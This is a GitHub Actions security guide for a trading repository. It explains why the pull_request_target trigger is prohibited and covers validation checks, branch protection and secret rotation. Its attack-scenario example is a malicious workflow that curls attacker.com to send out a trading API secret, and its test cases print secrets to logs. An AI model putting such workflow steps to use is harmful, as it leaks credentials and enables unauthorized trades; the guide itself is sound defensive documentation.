# GitHub Actions Workflow Security

## Overview

This repository contains sensitive credentials (Alpaca trading API keys, AWS credentials, email passwords) in GitHub Secrets. Proper workflow security is **critical** to prevent unauthorized access to these secrets, especially if the repository becomes public.

## Security Principles

### ✅ Safe Workflow Triggers

The following triggers are safe for public repositories:

1. **`push` to protected branches** - Only runs when code is merged to main
2. **`workflow_dispatch`** - Manual trigger, requires write access
3. **`schedule`** - Runs on cron, no external input
4. **Tags** - Triggered by version tags, requires write access

### ❌ Dangerous Workflow Triggers

The following triggers are **PROHIBITED** in this repository:

#### 🚨 CRITICAL: `pull_request_target`

**NEVER USE THIS TRIGGER IN PUBLIC REPOSITORIES**

```yaml
# ❌ DANGEROUS - DO NOT USE
on:
  pull_request_target:
```

**Why it's dangerous:**
- Runs in the context of the **base repository** (not the fork)
- Has access to **all repository secrets**
- Allows anyone to create a PR from a fork and execute arbitrary code with secret access
- Can steal API keys, execute unauthorized trades, compromise AWS infrastructure

**Attack scenario:**
```yaml
# Malicious PR adds this workflow
on:
  pull_request_target:

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Alpaca Key: ${{ secrets.ALPACA_KEY }}"
          curl -X POST https://attacker.com/steal -d "${{ secrets.ALPACA_SECRET }}"
```

#### ⚠️ WARNING: `pull_request` with secrets

**USE WITH EXTREME CAUTION**

```yaml
# ⚠️ RISKY - Avoid if possible
on:
  pull_request:

jobs:
  ci:
    steps:
      - run: echo "${{ secrets.ALPACA_KEY }}"  # Can leak in logs
```

**Why it's risky:**
- While the workflow runs in the fork's context (safer than `pull_request_target`)
- Secrets could still be leaked via:
  - Malicious code printing secrets to logs
  - Sending secrets to external services
  - Modifying tests to expose secrets

**Better alternative:**
```yaml
# ✅ SAFE - No secrets, just validation
on:
  pull_request:

permissions:
  contents: read  # Read-only, no secrets

jobs:
  ci:
    steps:
      - uses: actions/checkout@v6
      - run: make lint
      - run: make test  # No secrets needed for unit tests
```

## Current Workflow Security

### Protected Workflows (Require Secrets)

| Workflow | Trigger | Environment | Secrets Used |
|----------|---------|-------------|--------------|
| CD (Deployment) | `push` (tags), `workflow_dispatch` | dev/staging/prod | ✓ ALPACA, AWS, EMAIL |
| PnL Analysis | `workflow_dispatch`, `schedule` | prod | ✓ ALPACA, EMAIL |
| Debug Trading | `workflow_dispatch` | none | ✓ ALPACA, EMAIL |
| Deploy Shared Data | `workflow_dispatch` | dev | ✓ ALPACA, AWS |

### Public Workflows (No Secrets)

| Workflow | Trigger | Secrets Used |
|----------|---------|--------------|
| CI | `push` (main) | None |
| SonarQube | `workflow_dispatch` | ✓ SONAR_TOKEN (non-critical) |
| **Workflow Security Check** | `pull_request`, `push` | **None** |

## Automated Security Validation

### Validation Script

The script `scripts/validate_workflow_security.py` automatically checks all workflows for security issues:

```bash
# Run locally
python scripts/validate_workflow_security.py

# Run via Make
make validate-workflows
```

**What it checks:**
- ❌ Blocks `pull_request_target` trigger
- ⚠️ Warns about `pull_request` + secrets
- ✅ Validates all workflow files

### CI Integration

The `workflow-security-check.yml` workflow runs on:
- Every PR that modifies workflows
- Every push to main

This **prevents** malicious workflow modifications from being merged.

## Making the Repository Public

### Pre-flight Checklist

Before making the repository public, verify:

- [ ] Run `python scripts/validate_workflow_security.py` - must pass
- [ ] No workflows use `pull_request_target` trigger
- [ ] No workflows expose secrets in logs
- [ ] All sensitive workflows use `workflow_dispatch` or `push` to protected branches
- [ ] Branch protection rules are enabled on `main`
- [ ] Required status checks include `validate-workflows` job
- [ ] Secrets are properly scoped to environments (dev/staging/prod)

### Branch Protection Rules

Configure on GitHub: Settings → Branches → main → Add rule

**Required settings:**
```
☑ Require pull request reviews before merging
☑ Require status checks to pass before merging
  ☑ Require branches to be up to date before merging
  Status checks: (select all CI jobs including workflow-security-check)
☑ Require conversation resolution before merging
☑ Include administrators
☑ Restrict who can push to matching branches
```

### Environment Protection

Configure on GitHub: Settings → Environments

**For production environment:**
```
☑ Required reviewers: [Add trusted reviewers]
☑ Wait timer: 0 minutes
☑ Deployment branches: Only protected branches
```

## Security Incident Response

### If a Security Violation is Detected

1. **Immediately close the PR** - Do not merge
2. **Review the changes** - Understand what the PR attempted to do
3. **Check for secret exposure** - Review workflow run logs
4. **Rotate secrets if compromised:**
   - Regenerate Alpaca API keys
   - Rotate AWS credentials
   - Update email passwords
   - Update GitHub secrets with new values

### Reporting Security Issues

If you discover a security vulnerability:

1. **Do NOT open a public issue**
2. Contact repository maintainers privately
3. Provide details: workflow name, trigger type, potential impact
4. Wait for fix before public disclosure

## Testing Workflow Security

### Test Case 1: Malicious pull_request_target

Create a test branch with this workflow:

```yaml
# test-malicious.yml (for testing only - DO NOT MERGE)
name: Test Malicious Workflow
on:
  pull_request_target:  # This should be blocked

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "This should never run!"
```

**Expected result:** Validation script fails with CRITICAL error

### Test Case 2: pull_request with secrets

Create a test branch with this workflow:

```yaml
# test-risky.yml (for testing only - DO NOT MERGE)
name: Test Risky Workflow
on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.ALPACA_KEY }}"  # Risky!
```

**Expected result:** Validation script fails with WARNING

## Best Practices

### ✅ DO

- Use `push` trigger for workflows requiring secrets
- Use `workflow_dispatch` for manual sensitive operations
- Use environment protection for deployments
- Keep secrets scoped to specific environments
- Run security validation on every PR
- Review workflow changes carefully in PRs

### ❌ DON'T

- Use `pull_request_target` trigger
- Access secrets in `pull_request` workflows
- Print secrets to logs (even in safe workflows)
- Store secrets in code or comments
- Disable the workflow security check
- Override security validation failures

## Additional Resources

- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [Keeping your GitHub Actions secure](https://github.blog/2020-08-03-github-actions-improvements-for-fork-and-pull-request-workflows/)

## Questions?

If you're unsure whether a workflow change is safe:

1. Run `python scripts/validate_workflow_security.py`
2. Review this document
3. Ask for a security review before merging
4. When in doubt, use more restrictive permissions

**Remember: It's better to be overly cautious with workflow security than to risk credential exposure.**
